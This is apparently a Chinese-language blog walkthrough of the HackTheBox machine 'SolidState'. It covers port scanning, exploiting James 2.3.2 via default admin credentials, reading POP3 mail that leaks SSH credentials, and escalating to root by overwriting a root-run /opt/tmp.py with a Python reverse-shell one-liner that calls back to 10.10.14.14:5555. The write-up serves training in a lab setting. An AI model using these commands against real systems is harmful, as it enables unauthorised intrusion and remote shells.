# SolidState

**solidstate是hackthebox上一台中等难度的靶机**

- 首先使用nmap简单的扫描一下端口和可能的漏洞

![image-20211030101948613](http://cdn.mxrblog.cn/image-20211030101948613.png)

![image-20211029165916963](http://cdn.mxrblog.cn/image-20211029165916963.png)

- 浏览器上打开http://10.10.10.51:80

![image-20211029170000325](http://cdn.mxrblog.cn/image-20211029170000325.png)

- 扫描一下网站的目录

![image-20211030093859826](http://cdn.mxrblog.cn/image-20211030093859826.png)

- 查看README.txt

![image-20211030093923009](http://cdn.mxrblog.cn/image-20211030093923009.png)

- 通过之前namp扫描出的james 2.3.2， 查看这个是否有漏洞
- 发现漏洞，查看漏洞脚本，并且执行

![image-20211030100123651](http://cdn.mxrblog.cn/image-20211030100123651.png)

- 脚本返回结果是让我们在·本地监听，等到我们登陆的时候就会将shell返回给我们
- 再次查看py脚本，上面说james的默认登录名和密码都是root

![image-20211030100601637](http://cdn.mxrblog.cn/image-20211030100601637.png)

- nc登录下

![image-20211030102144765](http://cdn.mxrblog.cn/image-20211030102144765.png)

- 使用setpassword改变里面每个用户的密码

![image-20211030102618364](http://cdn.mxrblog.cn/image-20211030102618364.png)

- 登录110 端口并阅读邮件

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 110                                                     
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass 1234
+OK Welcome mindy
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James

```

```
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

```

- 发现邮件中已经给出了ssh需要的用户名与密码，登录

![image-20211030141945415](http://cdn.mxrblog.cn/image-20211030141945415.png)

- 此时我们nc监听的4444端口也已经收到了shell

![image-20211030142033202](http://cdn.mxrblog.cn/image-20211030142033202.png)

- 使用LinEnum.sh查看可以提权的文件

`./LinEnum.sh -t`

![image-20211030160102618](http://cdn.mxrblog.cn/image-20211030160102618.png)

- 利用/opt/tmp.py 提权

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /opt/tmp.py
```

- 无需运行脚本，等待一会后，kali上的nc监听会自动收到一个shell
- 获得root

![image-20211030162655751](http://cdn.mxrblog.cn/image-20211030162655751.png)
